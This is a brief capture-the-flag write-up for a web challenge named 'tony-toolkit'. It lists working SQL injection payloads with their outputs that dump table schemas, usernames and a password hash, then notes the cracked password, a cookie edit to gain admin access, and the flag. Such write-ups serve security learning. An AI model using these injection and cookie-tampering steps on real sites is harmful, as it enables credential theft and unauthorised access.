# web - tony-toolkit

`1' UNION SELECT name,2 FROM sqlite_master WHERE type='table'-- -`
```
Results:
Name: Products - Price: $2

Name: Users - Price: $2

Name: sqlite_sequence - Price: $2
```

`1' UNION SELECT sql,2 FROM sqlite_master WHERE name='Users'-- -`
```
Name: CREATE TABLE Users ( UserID INTEGER PRIMARY KEY AUTOINCREMENT, Username TEXT NOT NULL, Password TEXT NOT NULL) - Price: $2

```

`1' UNION SELECT Username,Password FROM Users-- -`
```
Results:
Name: Admin - Price: $0000000000000000000000000000000000000000000000000000000000000000

Name: Jerry - Price: $059a00192592d5444bc0caad7203f98b506332e2cf7abb35d684ea9bf7c18f08

```
Hash Crack from here. account:
```
user: Jerry
password: 1qaz2wsx
```
change cookie '2' to '1'

Flag: `0xfun{T0ny'5_T00ly4rd._1_H0p3_Y0u_H4d_Fun_SQL1ng,_H45H_Cr4ck1ng,_4nd_W1th_C00k13_M4n1pu74t10n}`

Solved by: OS1R1S

Solved by: yappare